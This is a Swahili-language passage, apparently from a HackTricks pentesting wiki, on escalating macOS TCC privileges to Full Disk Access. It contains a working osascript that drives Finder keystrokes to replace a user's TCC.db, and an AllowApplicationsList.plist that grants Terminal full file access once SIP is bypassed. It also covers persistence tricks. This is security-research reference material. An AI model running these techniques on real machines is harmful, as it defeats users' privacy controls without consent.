Automation kwenye **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) huruhusu kutuma **mibofyo ya vitufe kwa michakato**. Kwa njia hii, unaweza kutumia vibaya Finder kubadilisha TCC.db ya mtumiaji au kuipa FDA programu yoyote (ingawa huenda ukaombwa nenosiri).

Mfano wa Finder kubadilisha TCC.db ya mtumiaji:

```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
    -- Open Finder
    tell application "Finder" to activate

    -- Open the /tmp directory
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke "/tmp"
    delay 1
    keystroke return
    delay 1

    -- Select and copy the file
    keystroke "TCC.db"
    delay 1
    keystroke "c" using {command down}
    delay 1

    -- Resolve $HOME environment variable
    set homePath to system attribute "HOME"

    -- Navigate to the Desktop directory under $HOME
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke homePath & "/Library/Application Support/com.apple.TCC"
    delay 1
    keystroke return
    delay 1

    -- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
    keystroke "TCC.db"
    delay 1
    keystroke return
    delay 1
    key code 51 using {command down}
    delay 1

    -- Paste the file
    keystroke "v" using {command down}
end tell
EOF
```

### `kTCCServiceAccessibility` hadi FDA\*

Angalia ukurasa huu kwa [**payloads za kutumia vibaya ruhusa za Accessibility**](macos-tcc-payloads.md#accessibility) ili kupata privesc hadi FDA\* au kuendesha keylogger, kwa mfano.

### **Endpoint Security Client hadi FDA**

Ikiwa una **`kTCCServiceEndpointSecurityClient`**, una FDA. Basi.

### System Policy SysAdmin File hadi FDA

**`kTCCServiceSystemPolicySysAdminFiles`** inaruhusu **kubadilisha** sifa ya **`NFSHomeDirectory`** ya mtumiaji, na hivyo kubadilisha folda yake ya nyumbani na kuruhusu **kukwepa TCC**.<sup>[[5]](#references)</sup>

### User TCC DB hadi FDA

Ukipata **ruhusa za kuandika** kwenye hifadhidata ya **user TCC**, **huwezi** kujipa ruhusa za **`FDA`**; ni hifadhidata ya mfumo pekee inayoweza kutoa ruhusa hizo.

Lakini unaweza kujipa **Automation rights to Finder**, kisha kutumia vibaya mbinu iliyotangulia ili kupata FDA\*.

### **FDA hadi ruhusa za TCC**

Jina la **Full Disk Access** katika TCC ni **`kTCCServiceSystemPolicyAllFiles`**

Sidhani kama huu ni privesc halisi, lakini huenda ukawa na manufaa: Ikiwa unadhibiti programu yenye FDA, unaweza **kubadilisha hifadhidata ya TCC ya mtumiaji na kujipa ufikiaji wowote**. Hii inaweza kutumika kama mbinu ya persistence endapo utapoteza ruhusa zako za FDA.

### **SIP Bypass hadi TCC Bypass**

**Hifadhidata ya TCC** ya mfumo inalindwa na **SIP**; ndiyo maana ni michakato yenye **entitlements zilizoainishwa** pekee inayoweza kuibadilisha. Kwa hiyo, mshambuliaji akipata **SIP bypass** kwenye **faili** (akaweza kubadilisha faili iliyozuiwa na SIP), ataweza:

- **Kuondoa ulinzi** wa hifadhidata ya TCC na kujipa ruhusa zote za TCC. Kwa mfano, anaweza kutumia vibaya mojawapo ya faili hizi:
  - Hifadhidata ya TCC ya mfumo
  - REG.db
  - MDMOverrides.plist

Hata hivyo, kuna njia nyingine ya kutumia vibaya **SIP bypass ili kukwepa TCC**: faili `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` ni orodha ya programu zinazoruhusiwa ambazo zinahitaji ubaguzi wa TCC. Kwa hiyo, mshambuliaji akiweza **kuondoa ulinzi wa SIP** kwenye faili hii na kuongeza **programu yake mwenyewe**, programu hiyo itaweza kukwepa TCC.\
Kwa mfano, kuongeza terminal:

```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```

AllowApplicationsList.plist:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Services</key>
	<dict>
		<key>SystemPolicyAllFiles</key>
		<array>
			<dict>
				<key>CodeRequirement</key>
				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
				<key>IdentifierType</key>
				<string>bundleID</string>
				<key>Identifier</key>
				<string>com.apple.Terminal</string>
			</dict>
		</array>
	</dict>
</dict>
</plist>
```

### Kukwepa TCC


{{#ref}}
macos-tcc-bypasses/
{{#endref}}



## References

- [1] [Uchunguzi wa kina wa macOS TCC.db - Blogu ya Rainforest QA](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - script ya kufuatilia com.apple.macl (Gist ya brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Kufuatilia na kushughulikia com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Kukwepa kwa bahati mbaya na kwa makusudi ulinzi wa faragha wa mtumiaji wa macOS TCC](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Kubadilisha saraka ya nyumbani na kukwepa TCC, yaani CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [6] [SQL Injection katika TCC: na kwa nini (huenda) haikuwa hatari ya usalama (wakati huu)](https://wts.dev/posts/tcc-sql-injection/)
- [7] [Mahali pa TCC.db na jinsi ya kuipata kwenye macOS](https://www.tccparser.com/en/blog/tcc-db-location-acquisition)
- [8] [Kusanidi App Sandbox ya macOS](https://developer.apple.com/documentation/xcode/configuring-the-macos-app-sandbox)
- [9] [Entitlement ya kamera](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.device.camera)
- [10] [Mipangilio ya payload ya usimamizi wa kifaa ya Privacy Preferences Policy Control kwa vifaa vya Apple](https://support.apple.com/guide/deployment/privacy-preferences-policy-control-payload-dep38df53c2a/web)
- [11] [Kuchambua uvamizi wa macOS kuanzia mtego hadi kuathiriwa](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)
{{#include ../../../../banners/hacktricks-training.md}}
